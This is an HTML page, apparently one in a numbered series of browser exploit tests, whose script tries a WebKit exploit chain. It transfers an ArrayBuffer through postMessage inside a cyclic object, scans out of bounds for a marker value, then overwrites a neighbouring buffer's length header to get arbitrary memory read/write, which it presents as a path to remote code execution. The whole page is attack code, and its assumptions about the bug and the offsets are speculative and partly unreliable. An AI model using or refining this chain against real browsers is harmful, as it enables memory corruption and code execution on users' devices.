<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TEST 43 - Cadeia RCE: Info Leak + OOB Write</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; font-size: 16px; }
        button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; font-family: monospace; margin-top: 10px; }
        button:hover { background: #0f0; color: #111; }
    </style>
</head>
<body>
    <h2>TEST 43 — Exploit Chain (Leak -> Overwrite)</h2>
    <p><b>Objetivo:</b> Usar a falha do objeto cíclico para vazar memória, localizar um buffer alvo e usar o OOB write para corromper seu tamanho (length).</p>
    
    <button onclick="runExploitChain()">EXECUTAR CADEIA DE EXPLORAÇÃO</button>
    <pre id="log"></pre>

    <script>
        function info(msg) {
            document.getElementById('log').innerHTML += msg + '\n';
            console.log(msg);
        }

        function runExploitChain() {
            info("[*] Iniciando a cadeia de testes reais...");

            // 1. Preparação do Heap (Alocação sequencial para tentar deixá-los adjacentes)
            info("[*] Alocando buffers no Heap...");
            var leakBuffer = new ArrayBuffer(1024);
            var leakView = new Uint32Array(leakBuffer);
            
            // Colocamos um "Magic Number" no buffer vulnerável para identificação
            leakView[0] = 0xAAAAAAAA; 
            leakView[1] = 0xBBBBBBBB;

            // Este é o buffer que queremos corromper. 
            // Tamanho normal é 64 bytes. Queremos que vire 0xFFFFFFFF.
            var targetBuffer = new ArrayBuffer(64); 
            var targetView = new Uint32Array(targetBuffer);
            targetView[0] = 0x13371337; // Assinatura para acharmos o alvo na memória
            targetView[1] = 0xCAFEBABE;

            // 2. Criação da estrutura cíclica que causa a vulnerabilidade (Baseado no 42-C)
            var nested = { buf: leakBuffer, parent: null };
            var cycObj = { test_id: 'chain_test', target: targetBuffer, nested: nested, self: null };
            cycObj.self = cycObj;
            nested.parent = cycObj;

            info("[*] Disparando postMessage com objeto cíclico e transferência...");
            
            try {
                // Transfere o leakBuffer. No WebKit vulnerável, a referência cíclica 
                // corrompe o estado, mantendo o acesso ou dessincronizando o tamanho.
                postMessage(cycObj, '*', [leakBuffer]);
            } catch(e) {
                info("[-] Erro esperado/ignorado no postMessage: " + e.message);
            }

            // Damos um pequeno delay para garantir que o GC (Garbage Collector) 
            // e o worker assíncrono do postMessage processem a transferência.
            setTimeout(function() {
                info("[*] Verificando o estado após a transferência...");
                info("    leakBuffer.byteLength: " + leakBuffer.byteLength);
                info("    targetBuffer.byteLength: " + targetBuffer.byteLength);

                // 3. Fase de Leak e Busca (Baseado no 42-C)
                var offsetToTarget = -1;
                var found = false;

                try {
                    // Se o bug funcionou, leakView ainda pode ser lida ou tem tamanho corrompido
                    // Vamos tentar ler além do limite original procurando a assinatura do alvo
                    // NOTA: Dependendo de como o OOB do 42-B se manifesta no seu teste exato, 
                    // o loop abaixo tenta ler índices fora do limite.
                    
                    info("[*] Escaneando memória vazada em busca do Target (0x13371337)...");
                    for (let i = 0; i < 500; i++) {
                        // Tenta ler. Se o WebKit lançar erro, o catch captura.
                        let val = leakView[i]; 
                        
                        if (val === 0x13371337) {
                            if (leakView[i+1] === 0xCAFEBABE) {
                                offsetToTarget = i;
                                found = true;
                                info("[+] SUCESSO! Assinatura do Target encontrada no índice offset: " + i);
                                break;
                            }
                        }
                    }
                } catch(e) {
                    info("[-] Acesso bloqueado durante a varredura: " + e.message);
                }

                // 4. Fase OOB Write (Baseado no 42-B)
                if (found) {
                    info("[*] Iniciando OOB Write para corromper o ArrayBuffer Target...");
                    
                    try {
                        // O cabeçalho do ArrayBuffer (onde fica o byteLength) geralmente 
                        // está alguns bytes ANTES dos dados reais (onde está o 0x13371337).
                        // Em WebKit de 64-bits, costuma ser 4 ou 8 índices (Uint32) para trás.
                        // Aqui testamos sobrescrever a região do cabeçalho com um tamanho gigante.
                        
                        let lengthOffset = offsetToTarget - 4; // Ajuste este offset conforme a arquitetura do console
                        
                        info("[*] Escrevendo 0xFFFFFFFF no suposto offset de tamanho: " + lengthOffset);
                        leakView[lengthOffset] = 0xFFFFFFFF; // Corrompe o tamanho do target
                        leakView[lengthOffset + 1] = 0xFFFFFFFF; 

                        info("[+] Escrita finalizada. Verificando impacto...");
                    } catch(e) {
                        info("[-] Falha ao tentar escrever: " + e.message);
                    }
                } else {
                    info("[-] Alvo não encontrado. Pode ser necessário refinar o Heap Spray ou o bug não vazou memória suficiente nesta tentativa.");
                }

                // 5. Verificação Final (O Santo Graal)
                info("--------------------------------------------------");
                info("VERIFICAÇÃO DE SUCESSO:");
                if (targetBuffer.byteLength > 64) {
                    info("[!!!] RCE POSSÍVEL: OVERWRITE BEM SUCEDIDO!");
                    info("[!!!] Novo targetBuffer.byteLength: " + targetBuffer.byteLength + " bytes");
                    info("[!!!] Você agora tem um buffer de leitura/escrita arbitrária na memória do navegador.");
                } else {
                    info("[-] targetBuffer.byteLength permanece em " + targetBuffer.byteLength + " bytes.");
                    info("[-] Dica: O offset (" + (offsetToTarget - 4) + ") para o cabeçalho do ArrayBuffer pode precisar de ajustes milimétricos (tente -2, -6, -8).");
                }

            }, 500); // 500ms de delay
        }
    </script>
</body>
</html>
